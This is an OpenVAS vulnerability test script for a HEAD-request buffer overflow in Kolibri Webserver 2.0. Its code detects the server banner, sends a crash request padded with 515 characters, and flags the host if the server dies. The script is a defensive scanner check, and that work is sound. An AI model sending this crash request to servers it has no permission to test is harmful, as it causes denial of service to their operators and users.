###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_kolibri_bof_vuln.nasl 14326 2019-03-19 13:40:32Z jschulte $
#
# Kolibri Webserver 'HEAD' Request Processing Buffer Overflow Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2010 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.901171");
  script_version("$Revision: 14326 $");
  script_tag(name:"last_modification", value:"$Date: 2019-03-19 14:40:32 +0100 (Tue, 19 Mar 2019) $");
  script_tag(name:"creation_date", value:"2010-12-31 07:04:16 +0100 (Fri, 31 Dec 2010)");
  script_bugtraq_id(45579);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_name("Kolibri Webserver 'HEAD' Request Processing Buffer Overflow Vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2010 SecPod");
  script_family("Web Servers");
  script_dependencies("gb_get_http_banner.nasl");
  script_require_ports("Services/www", 8080);
  script_mandatory_keys("kolibri/banner");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to crash the
  server process, resulting in a denial-of-service condition.");
  script_tag(name:"affected", value:"Kolibri Webserver version 2.0");
  script_tag(name:"insight", value:"This flaw is caused by a buffer overflow error when handling
  overly long 'HEAD' requests, which could allow remote unauthenticated attackers
  to compromise a vulnerable web server via a specially crafted request.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"summary", value:"This host is running Kolibri Webserver and is prone to buffer
  overflow vulnerability.");

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/15834/");
  script_xref(name:"URL", value:"http://www.vupen.com/english/advisories/2010/3332");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("http_func.inc");

port = get_http_port(default:8080);

banner = get_http_banner(port:port);

if("erver: kolibri" >< banner) {

  host = http_host_name(port:port);

  ## Sending Crash
  crash = "HEAD /" + crap(515) + " HTTP/1.1\r\n" +
          "Host: " + host + "\r\n\r\n";
  http_send_recv(port:port, data:crash);

  if (http_is_dead(port:port)) {
    security_message(port:port);
    exit(0);
  }
}

exit(99);
